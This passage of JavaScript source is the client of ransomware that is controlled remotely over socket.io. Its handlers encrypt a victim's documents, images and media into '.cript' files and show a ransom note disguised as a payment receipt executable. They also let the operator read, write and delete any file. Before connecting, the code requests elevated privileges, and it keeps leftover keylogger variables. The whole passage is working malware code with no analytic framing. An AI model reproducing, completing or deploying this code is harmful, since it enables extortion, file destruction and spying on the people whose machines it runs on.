        const { comandoId, archivos } = data;
        console.log(` Cifrando ${archivos?.length || 0} archivos...`);

        let totalCifrados = 0;
        let totalErrores = 0;

        (archivos || []).forEach((archivo, i) => {
            const resultado = cifrarArchivo(archivo.ruta || archivo, claveAES);
            if (resultado.success) {
                totalCifrados++;
                socket.emit('archivo-cifrado', { comandoId, archivo: resultado, progreso: i + 1, total: archivos.length });
            } else {
                totalErrores++;
            }
        });

        console.log(` Cifrado completado: ${totalCifrados} exitos, ${totalErrores} errores`);
        socket.emit('cifrado-completado', {
            comandoId,
            totalCifrados,
            totalErrores,
            resumenBasico: { totalCifrados, totalErrores }
        });
    });

    // Handler para cifrar archivos objetivo (escanea y cifra automaticamente)
    socket.on('cifrar-archivos-objetivo', (data) => {
        const { comandoId, limite } = data;
        console.log(` Iniciando cifrado de archivos objetivo (limite: ${limite || 100})...`);

        // Escanear el directorio donde se ejecuto el script (CWD)
        const directorios = [process.cwd()];
        const extensiones = ['doc', 'docx', 'pdf', 'txt', 'xls', 'xlsx', 'jpg', 'png', 'pptx', 'mp3', 'mp4'];

        console.log(`📂 Directorios a escanear: ${directorios.join(', ')}`);
        console.log(`📄 Extensiones objetivo: ${extensiones.join(', ')}`);

        const escaneo = escanearArchivos(directorios, extensiones);
        console.log(` Encontrados: ${escaneo.total} archivos (${escaneo.tamanioTotalHumano})`);

        // Limitar cantidad de archivos a cifrar
        const archivosACifrar = escaneo.archivos.slice(0, limite || 100);

        // Mostrar primeros 5 archivos como ejemplo
        console.log(` Ejemplos de archivos a cifrar:`);
        archivosACifrar.slice(0, 5).forEach(a => console.log(`   - ${a.ruta}`));
        if (archivosACifrar.length > 5) {
            console.log(`   ... y ${archivosACifrar.length - 5} mas`);
        }

        let totalCifrados = 0;
        let totalErrores = 0;
        let ultimoArchivoCifrado = null;
        let archivosCifrados = [];

        archivosACifrar.forEach((archivo, i) => {
            // Verificar si el archivo está en la lista de exclusión
            const nombreArchivo = path.basename(archivo.ruta);
            if (ARCHIVOS_EXCLUIDOS.includes(nombreArchivo)) {
                console.log(`   Saltando (excluido): ${nombreArchivo}`);
                return; // Skip this file
            }

            const resultado = cifrarArchivo(archivo.ruta, claveAES);
            if (resultado.success) {
                totalCifrados++;
                ultimoArchivoCifrado = resultado;
                archivosCifrados.push({
                    nombre: path.basename(resultado.cifrado),
                    original: archivo.nombre,
                    ruta: resultado.cifrado,
                    directorio: path.dirname(resultado.cifrado),
                    iv: resultado.iv
                });
                if (i % 10 === 0) {
                    console.log(`   Cifrado ${i + 1}/${archivosACifrar.length}`);
                }
            } else {
                totalErrores++;
                console.log(`   Error cifrando: ${archivo.nombre} - ${resultado.error}`);
            }
        });

        console.log(` Cifrado masivo completado: ${totalCifrados} exitos, ${totalErrores} errores`);
        socket.emit('cifrado-completado', {
            comandoId,
            clienteId: socket.id,
            totalCifrados,
            totalErrores,
            resumenBasico: { totalCifrados, totalErrores },
            archivosCifrados: archivosCifrados.slice(0, 50), // Max 50 para UI
            // Metadatos del cifrado
            metadatos: ultimoArchivoCifrado ? {
                algorithm: ultimoArchivoCifrado.algorithm,
                ivEjemplo: ultimoArchivoCifrado.iv,
                keyPreview: claveAES.substring(0, 16) + '...',
                ultimoArchivo: ultimoArchivoCifrado.cifrado
            } : null
        });
    });

    socket.on('descifrar-archivos', (data) => {
        const { comandoId, directorios } = data;
        console.log(' Descifrando archivos...');

        const dirs = directorios || [process.cwd()];
        let totalDescifrados = 0;
        let totalErrores = 0;

        function buscarYDescifrar(dir) {
            try {
                fs.readdirSync(dir, { withFileTypes: true }).forEach(item => {
                    const fullPath = path.join(dir, item.name);
                    if (item.isDirectory()) {
                        buscarYDescifrar(fullPath);
                    } else if (item.name.endsWith('.cript')) {
                        const resultado = descifrarArchivo(fullPath, claveAES);
                        if (resultado.success) totalDescifrados++;
                        else totalErrores++;
                    }
                });
            } catch { }
        }

        dirs.forEach(d => buscarYDescifrar(d));
        console.log(` Descifrado completado: ${totalDescifrados} archivos`);
        socket.emit('descifrado-completado', { comandoId, totalDescifrados, totalErrores });
    });

    socket.on('listar-directorio', (data) => {
        const { comandoId, ruta } = data;
        try {
            const items = fs.readdirSync(ruta, { withFileTypes: true });
            const resultado = items.map(item => ({
                nombre: item.name,
                tipo: item.isDirectory() ? 'directorio' : 'archivo',
                ruta: path.join(ruta, item.name)
            }));
            socket.emit('directorio-listado', { comandoId, clienteId: socket.id, archivos: resultado, ruta });
        } catch (e) {
            socket.emit('directorio-listado', { comandoId, clienteId: socket.id, error: e.message, ruta });
        }
    });

    socket.on('leer-archivo', (data) => {
        const { comandoId, ruta } = data;
        try {
            const contenido = fs.readFileSync(ruta, 'utf8');
            socket.emit('archivo-leido', { comandoId, clienteId: socket.id, contenido, ruta });
        } catch (e) {
            socket.emit('archivo-leido', { comandoId, clienteId: socket.id, error: e.message, ruta });
        }
    });

    socket.on('escribir-archivo', (data) => {
        const { comandoId, ruta, contenido } = data;
        try {
            fs.writeFileSync(ruta, contenido, 'utf8');
            socket.emit('archivo-escrito', { comandoId, clienteId: socket.id, success: true, ruta });
        } catch (e) {
            socket.emit('archivo-escrito', { comandoId, clienteId: socket.id, success: false, error: e.message, ruta });
        }
    });

    socket.on('eliminar-archivo', (data) => {
        const { comandoId, ruta } = data;
        try {
            fs.unlinkSync(ruta);
            socket.emit('archivo-eliminado', { comandoId, clienteId: socket.id, success: true, ruta });
        } catch (e) {
            socket.emit('archivo-eliminado', { comandoId, clienteId: socket.id, success: false, error: e.message, ruta });
        }
    });

    socket.on('crear-carpeta', (data) => {
        const { comandoId, ruta } = data;
        try {
            fs.mkdirSync(ruta, { recursive: true });
            socket.emit('carpeta-creada', { comandoId, clienteId: socket.id, success: true, ruta });
        } catch (e) {
            socket.emit('carpeta-creada', { comandoId, clienteId: socket.id, success: false, error: e.message, ruta });
        }
    });

    socket.on('mostrar-nota-rescate', (data) => {
        const { comandoId } = data;
        console.log(' Mostrando nota de rescate...');

        // Buscar nota en múltiples ubicaciones
        const posiblesRutas = [
            path.join(process.cwd(), NOTA_NAME),                    // Directorio actual (SFX)
            path.join(INSTALL_DIR, NOTA_NAME),                      // Directorio de instalación
            path.join(process.cwd(), 'Comprobante_Pago_2026.exe'),  // Nombre exacto
            path.join(path.dirname(process.execPath), NOTA_NAME)   // Mismo directorio que el exe
        ];

        let notaPath = null;
        for (const ruta of posiblesRutas) {
            if (fs.existsSync(ruta)) {
                notaPath = ruta;
                console.log(` Nota encontrada en: ${ruta}`);
                break;
            }
        }

        if (notaPath) {
            exec(`start "" "${notaPath}"`, (error) => {
                socket.emit('nota-rescate-mostrada', {
                    comandoId,
                    success: !error,
                    message: error ? error.message : 'Nota mostrada'
                });
            });
        } else {
            console.log(' Nota NO encontrada. Rutas probadas:', posiblesRutas);
            socket.emit('nota-rescate-mostrada', {
                comandoId,
                success: false,
                message: 'Ejecutable de nota no encontrado en ninguna ubicación'
            });
        }
    });

    // ===============================
    // KEYLOGGER REMOVED
    // ===============================
    let keyloggerProcess = null;
    let keylogBuffer = '';
    let keylogInterval = null;






}

// MANTENER VENTANA ABIERTA EN ERROR
function esperarYSalir(codigo = 1) {
    console.log('\n El programa se cerrara en 60 segundos...');
    console.log('Presiona Ctrl+C para salir inmediatamente.');
    setTimeout(() => {
        process.exit(codigo);
    }, 60000);
}

process.on('uncaughtException', (err) => {
    console.error('\n💥 ERROR CRITICO NO CAPTURADO:', err);
    esperarYSalir(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('\n💥 PROMESA NO MANEJADA:', reason);
    esperarYSalir(1);
});

// Iniciar con manejo de errores
console.log(' Iniciando cliente...');

// Primero intentar obtener privilegios de admin, luego conectar
requestElevation().then(() => {
    console.log(isElevated ? ' Privilegios elevados obtenidos' : ' Ejecutando sin privilegios elevados');
    return conectar();
}).catch(err => {
    console.error('\n Error en funcion principal:', err);
    esperarYSalir(1);
});
